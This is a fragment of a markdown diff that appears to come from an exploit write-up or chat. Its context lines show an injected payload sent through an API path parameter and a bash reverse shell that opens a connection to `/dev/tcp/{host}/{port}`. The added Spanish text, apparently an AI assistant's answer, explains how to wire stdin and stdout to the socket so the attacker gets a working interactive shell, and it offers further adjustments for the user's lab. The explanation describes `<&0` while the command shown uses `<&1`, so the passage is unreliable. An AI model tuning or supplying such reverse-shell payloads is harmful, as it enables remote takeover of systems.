@@ -518,3 +518,11 @@ step4 = req.get(url+"~/api/get_ls?path=/tmp/"+payload, headers=headers)
 ```
 
 "bash -c '/bin/bash -i >& /dev/tcp/{0}/{1} <&1'"
+### Explicación de los cambios:
+
+- `>& /dev/tcp/{0}/{1}`: Esto redirige la salida estándar y la salida de error estándar al socket TCP.
+- `<&0`: Esto redirige la entrada estándar (`stdin`) al socket TCP. En este caso, `<&0` especifica que la entrada estándar debe ser utilizada para el flujo de entrada.
+
+La idea es que conectes la entrada (`stdin`) y la salida (`stdout` y `stderr`) al mismo socket TCP para que la shell interactiva funcione correctamente. Este comando ahora debería permitir la comunicación completa entre el atacante y el shell en la máquina objetivo.
+
+Prueba este comando en tu laboratorio, y si necesitas más ajustes, estaré aquí para ayudarte.
